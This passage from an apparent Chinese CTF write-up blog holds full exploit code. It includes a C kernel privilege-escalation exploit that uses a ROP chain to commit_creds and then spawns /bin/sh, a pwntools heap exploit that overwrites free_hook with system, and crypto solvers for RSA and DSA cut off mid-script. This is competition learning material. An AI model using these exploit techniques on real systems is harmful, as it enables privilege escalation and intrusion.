class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kalloc0x73311337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kfree0x13377331</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> printk0xDEADBEEF</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_off0x81790</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_off0x81410</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret0x3a591c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_rdi_cr40x4e5b1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_ret0x44f17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mv_rax_in_rdx0x6b31</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_quit</span><span class="params">(<span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(p);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span> *);</span><br><span class="line"><span class="keyword">void</span> (*prepare_kernel_cred)(<span class="keyword">void</span> *);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">(<span class="keyword">int</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,fd,t[<span class="number">0x100</span>];</span><br><span class="line"><span class="keyword">char</span> p[<span class="number">0x2008</span>];</span><br><span class="line">signal(SIGSEGV, get_root);</span><br><span class="line"><span class="keyword">char</span> *leak = <span class="string">"%lx %lx %lx %lx %lx kernel:0x%lx %lx %lx %lx stack:0x%lx %lx %lx %lx %lx aa\n"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel;</span><br><span class="line">        <span class="keyword">if</span> ((fd = open(<span class="string">"/dev/meizijiutql"</span>,O_RDWR)) == <span class="number">-1</span>)</span><br><span class="line">error_quit(<span class="string">"open error"</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x103</span>; i++)</span><br><span class="line">ioctl(fd, kalloc, <span class="number">0xff9</span>);</span><br><span class="line">write(fd, leak, <span class="built_in">strlen</span>(leak));</span><br><span class="line">ioctl(fd, printk, <span class="number">0</span>);</span><br><span class="line">ioctl(fd, printk, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input kernel_base\n"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lx"</span>,&amp;kernel);</span><br><span class="line">kernel = kernel &amp; <span class="number">0xfffffffffff00000</span>;</span><br><span class="line">kernel -= <span class="number">0x100000</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input stack_addr\n"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lx"</span>,&amp;<span class="built_in">stack</span>);</span><br><span class="line"><span class="built_in">stack</span> = <span class="built_in">stack</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;p[<span class="number">0x1000</span>]) = <span class="built_in">stack</span>;</span><br><span class="line">write(fd, p, <span class="number">0x1008</span>);</span><br><span class="line"><span class="built_in">memset</span>(p,<span class="number">0x90</span>,<span class="number">0x2000</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *rop = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;p[<span class="number">0xe50</span><span class="number">-8</span>];</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%lx\n"</span>,pop_rdi_ret+kernel);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">rop[i++] = pop_rdi_ret + kernel;</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = prepare_off + kernel;</span><br><span class="line">rop[i++] = pop_rdx_ret + kernel;</span><br><span class="line">rop[i++] = <span class="built_in">stack</span> + <span class="number">0xe80</span>;</span><br><span class="line">rop[i++] = mv_rax_in_rdx + kernel;</span><br><span class="line">rop[i++] = pop_rdi_ret + kernel;</span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = commit_off + kernel;</span><br><span class="line">rop[i++] = <span class="number">0xa00d5a</span> + kernel;</span><br><span class="line">rop[i++] = <span class="number">0x246</span>;</span><br><span class="line">rop[i++] = <span class="number">0x021880</span> + kernel;</span><br><span class="line">rop[i++] = get_root;</span><br><span class="line">rop[i++] = <span class="number">0x33</span>;</span><br><span class="line">rop[i++] = <span class="number">0x246</span>;</span><br><span class="line">rop[i++] = p;</span><br><span class="line">rop[i++] = <span class="number">0x2b</span>;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">0x700</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">ioctl(fd, kalloc, <span class="number">0xff9</span>);</span><br><span class="line">write(fd, p, <span class="number">0x1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="二手旧电脑">二手旧电脑</span></h2><p>这道题比较简单</p><p>漏洞很明显，off by null</p><p>利用 off by null 可以控制其他chunk</p><p>然后再fastbin attack到heap第一个chunk那里</p><p>再利用题目给的rename，就可以进行任意写，写到free_hook为system，然后就可以了</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'47.111.59.243'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(sz,name,price)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'length: '</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'Name: '</span>)</span><br><span class="line">    se(name)</span><br><span class="line">    ru(<span class="string">'Price: '</span>)</span><br><span class="line">    sl(str(price))</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment</span><span class="params">(idx,content,score)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Comment on'</span>)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(<span class="string">'score:'</span>)</span><br><span class="line">    sl(str(score))</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">throw</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Comment '</span>)</span><br><span class="line">    data = ru(<span class="string">' will'</span>)[:<span class="number">-5</span>]</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">'a\n'</span>,<span class="number">100</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'a\n'</span>,<span class="number">200</span>)</span><br><span class="line">comment(<span class="number">0</span>,<span class="string">'aaaa\n'</span>,<span class="number">100</span>)</span><br><span class="line">throw(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a\n'</span>,<span class="number">100</span>)</span><br><span class="line">comment(<span class="number">0</span>,<span class="string">'a'</span>,<span class="number">100</span>)</span><br><span class="line">libc = u32(throw(<span class="number">0</span>)[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    base = libc<span class="number">-0x1b27b0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    base = libc<span class="number">-0x1b07b0</span></span><br><span class="line"></span><br><span class="line">throw(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">'c'</span>*<span class="number">20</span>+<span class="string">'\n'</span>,<span class="number">100</span>)</span><br><span class="line">throw(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="string">'wwwww\n'</span>,<span class="number">100</span>)</span><br><span class="line">comment(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">heap = u32(throw(<span class="number">0</span>)[<span class="number">0x10</span>:<span class="number">0x14</span>])<span class="number">-0x48</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">'a\n'</span>,<span class="number">100</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    throw(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'b\n'</span>,<span class="number">200</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">'a\n'</span>,<span class="number">100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'a\n'</span>,<span class="number">100</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'b\n'</span>,<span class="number">200</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'c\n'</span>,<span class="number">300</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">throw(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xfc</span>,(p32(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">0xf1</span>)+p32(heap+<span class="number">0x288</span>)+p32(heap+<span class="number">0x288</span>)+p32(heap+<span class="number">0x278</span>)*<span class="number">4</span>).ljust(<span class="number">0xf8</span>,<span class="string">'a'</span>)+p32(<span class="number">0xf0</span>),<span class="number">200</span>) <span class="comment">#2</span></span><br><span class="line">throw(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xec</span>,<span class="string">'a\n'</span>,<span class="number">100</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'b\n'</span>,<span class="number">200</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">throw(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x2c</span>,<span class="string">'qqqqqq\n'</span>,<span class="number">100</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xbc</span>,<span class="string">'a\n'</span>,<span class="number">100</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">throw(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">throw(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook =  base + 0x1b38b0</span></span><br><span class="line">free_hook = base + <span class="number">0x1b18b0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xfc</span>,p32(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">0x31</span>)+p32(heap)+<span class="string">'\n'</span>,<span class="number">100</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x2c</span>,p32(<span class="number">0</span>)+p32(heap+<span class="number">0x8</span>)+p32(<span class="number">0</span>)+p32(free_hook)+p32(<span class="number">0</span>)+p32(heap+<span class="number">0x298</span>)+<span class="string">'/bin/sh\0'</span>+<span class="string">'\n'</span>,<span class="number">100</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x2c</span>,p32(heap+<span class="number">0x290</span>)+p32(heap+<span class="number">0x280</span>)+<span class="string">'\n'</span>,<span class="number">100</span>) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">'4'</span>)</span><br><span class="line">ru(<span class="string">'Give me an index: '</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">se(p32(heap+<span class="number">0x290</span>)+p32(heap+<span class="number">0x288</span>))</span><br><span class="line">ru(<span class="string">'Wanna get more power?(y/n)'</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'y'</span>)</span><br><span class="line">ru(<span class="string">'Give me serial:'</span>)</span><br><span class="line">se(<span class="string">'e4SyD1C!'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="comment">#se('a'+p32(base+0x3ada0))</span></span><br><span class="line">se(<span class="string">'a'</span>+p32(base+<span class="number">0x3a940</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(free_hook))</span><br><span class="line">print(hex(base))</span><br><span class="line">print(hex(heap))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="crypto">Crypto</span></h1><h2><span id="prime">Prime</span></h2><p>题目给出4个N，不知道是咋生成的</p><p>瞎试，发现n0 n1不互质，后来发现任意两个都不互质，然后就能求出每个n的四个因子。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> a &lt; b:</span><br><span class="line">     a, b = b, a</span><br><span class="line">   <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">     temp = a % b</span><br><span class="line">     a = b</span><br><span class="line">     b = temp</span><br><span class="line">   <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">"0123456789abcdefABCDEF"</span></span><br><span class="line">p = remote(<span class="string">"47.111.59.243"</span>,<span class="string">"8003"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"[*] Please find a string that md5(str + "</span>)</span><br><span class="line">salt = p.recv(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"[0:5] == "</span>)</span><br><span class="line">part_hash = p.recv(<span class="number">5</span>)</span><br><span class="line">found = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> s:</span><br><span class="line">                    ss = i+j+k+l+m</span><br><span class="line">                    <span class="keyword">if</span> md5(ss+salt).hexdigest()[:<span class="number">5</span>] == part_hash:</span><br><span class="line">                        found = <span class="number">1</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> found:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> found:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(ss)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"cs[0] = "</span>)</span><br><span class="line">c1 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"ns[0] = "</span>)</span><br><span class="line">n1 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"cs[1] = "</span>)</span><br><span class="line">c2 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"ns[1] = "</span>)</span><br><span class="line">n2 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"cs[2] = "</span>)</span><br><span class="line">c3 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"ns[2] = "</span>)</span><br><span class="line">n3 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"cs[3] = "</span>)</span><br><span class="line">c4 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"ns[3] = "</span>)</span><br><span class="line">n4 = eval(p.recvline())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n1p1 = gcd(n1,n2)</span><br><span class="line">n1p2 = gcd(n1,n3)</span><br><span class="line">n1p3 = gcd(n1,n4)</span><br><span class="line">n1p4 = n1/(n1p1*n1p2*n1p3)</span><br><span class="line">d1=int(gmpy2.invert(n1,(n1p1<span class="number">-1</span>)*(n1p2<span class="number">-1</span>)*(n1p3<span class="number">-1</span>)*(n1p4<span class="number">-1</span>)))</span><br><span class="line">m1 = pow(c1,d1,n1)</span><br><span class="line"></span><br><span class="line">n2p1 = gcd(n2,n1)</span><br><span class="line">n2p2 = gcd(n2,n3)</span><br><span class="line">n2p3 = gcd(n2,n4)</span><br><span class="line">n2p4 = n2/(n2p1*n2p2*n2p3)</span><br><span class="line">d2=int(gmpy2.invert(n2,(n2p1<span class="number">-1</span>)*(n2p2<span class="number">-1</span>)*(n2p3<span class="number">-1</span>)*(n2p4<span class="number">-1</span>)))</span><br><span class="line">m2 = pow(c2,d2,n2)</span><br><span class="line"></span><br><span class="line">n3p1 = gcd(n3,n1)</span><br><span class="line">n3p2 = gcd(n3,n2)</span><br><span class="line">n3p3 = gcd(n3,n4)</span><br><span class="line">n3p4 = n3/(n3p1*n3p2*n3p3)</span><br><span class="line">d3=int(gmpy2.invert(n3,(n3p1<span class="number">-1</span>)*(n3p2<span class="number">-1</span>)*(n3p3<span class="number">-1</span>)*(n3p4<span class="number">-1</span>)))</span><br><span class="line">m3 = pow(c3,d3,n3)</span><br><span class="line"></span><br><span class="line">n4p1 = gcd(n4,n2)</span><br><span class="line">n4p2 = gcd(n4,n3)</span><br><span class="line">n4p3 = gcd(n4,n1)</span><br><span class="line">n4p4 = n4/(n4p1*n4p2*n4p3)</span><br><span class="line">d4=int(gmpy2.invert(n4,(n4p1<span class="number">-1</span>)*(n4p2<span class="number">-1</span>)*(n4p3<span class="number">-1</span>)*(n4p4<span class="number">-1</span>)))</span><br><span class="line">m4 = pow(c4,d4,n4)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"ms[0] = "</span>)</span><br><span class="line">p.sendline(hex(m1))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"ms[1] = "</span>)</span><br><span class="line">p.sendline(hex(m2))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"ms[2] = "</span>)</span><br><span class="line">p.sendline(hex(m3))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"ms[3] = "</span>)</span><br><span class="line">p.sendline(hex(m4))</span><br><span class="line"></span><br><span class="line">print(p.recvline().strip())</span><br></pre></td></tr></table></figure><h2><span id="dsa">DSA</span></h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819110748-864d63d8-c22e-1.png" alt="image.png"> 脚本如下： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric.rsa <span class="keyword">import</span> _modinv</span><br><span class="line"></span><br><span class="line">p = <span class="number">89884656743115795580686663829063433723705316331915518116995555215732107995059028542508401244839154951727540560161931978595376162965578570688594466436802284147607626105578924348149452183916543288346766737451989059750506942292767656446346135964708979885460659773076011464167414551120634816058711585048191954497</span></span><br><span class="line">q = <span class="number">1111804377363103506497255080558092668997313464491</span></span><br><span class="line">g = <span class="number">81015871603456981032885262867256289415428185718067221863176015480426278916784273932461088597278453025238130171264554340337052290801398971212149002598733514497274080038687844873045392142055341888546884513467006243654622193996237786587933291936305860861104505778330178660321910982065964185311229731036440300912</span></span><br><span class="line">y = <span class="number">24205967076065946398939942966555243225474145978138314135133201932616151998778053968114291774217862261420967723355996662814191035892360634754604901035581578539634376520187757713469318847622699231634156440729178396025399617453913697005440949117064991219553520585024955478025227096450962672242862991836900979588</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到一组同r的数据，m为字符串的md5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># And see the brave day sunk in hideous night</span></span><br><span class="line"><span class="comment"># Its MD5 digest: 189275664133327295485034625257633857845</span></span><br><span class="line"><span class="comment"># (1110285731834476772119910400331516120389395795749L, 671563422243860980520073471433161684440141852624L)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># And sable curls all silver'd o'er with white</span></span><br><span class="line"><span class="comment"># Its MD5 digest: 76447611971473350019028042637993930502</span></span><br><span class="line"><span class="comment"># (1110285731834476772119910400331516120389395795749L, 218895397309026853341136197466419726836220239272L)</span></span><br><span class="line"></span><br><span class="line">s0=<span class="number">671563422243860980520073471433161684440141852624</span></span><br><span class="line">s1=<span class="number">218895397309026853341136197466419726836220239272</span></span><br><span class="line"></span><br><span class="line">m0=<span class="number">189275664133327295485034625257633857845</span></span><br><span class="line">m1=<span 